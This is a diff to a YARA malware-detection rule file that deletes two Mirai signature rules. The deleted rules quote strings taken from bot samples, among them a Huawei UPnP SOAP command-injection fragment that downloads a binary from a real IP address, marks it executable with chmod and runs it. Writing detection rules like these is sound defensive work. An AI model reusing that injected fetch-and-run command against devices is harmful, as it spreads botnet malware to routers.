@@ -36286,27 +36286,6 @@ rule Mirai_signature__45a0a340 {
       all of them
 }
 
-rule Mirai_signature__2ec3483d {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_2ec3483d.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-28"
-      hash1 = "2ec3483dd5a64ada98ae8325d051e3869d541b56c05a9cb11138b46ffeeeb14c"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
-      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
-      $s5 = "killattk" fullword ascii /* score: '8.00'*/
-      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
-      $s7 = "htndhfg" fullword ascii /* score: '8.00'*/
-      $s8 = "botkill" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
 rule Mirai_signature__461028c5 {
    meta:
       description = "_subset_batch - file Mirai(signature)_461028c5.elf"
@@ -36346,28 +36325,6 @@ rule Mirai_signature__4863f247 {
       $s8 = "botkill" fullword ascii /* score: '8.00'*/
    condition:
       uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
-rule Mirai_signature__6bb2ddfe {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_6bb2ddfe.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-28"
-      hash1 = "6bb2ddfe4837b3c856aabd643e2dcc8bfd50f38edef0f12ceb9f49aadc28c522"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
-      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
-      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
-      $s6 = "killattk" fullword ascii /* score: '8.00'*/
-      $s7 = "fddldlfb" fullword ascii /* score: '8.00'*/
-      $s8 = "htndhfg" fullword ascii /* score: '8.00'*/
-      $s9 = "botkill" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 300KB and
       1 of ($x*) and all of them
 }
 
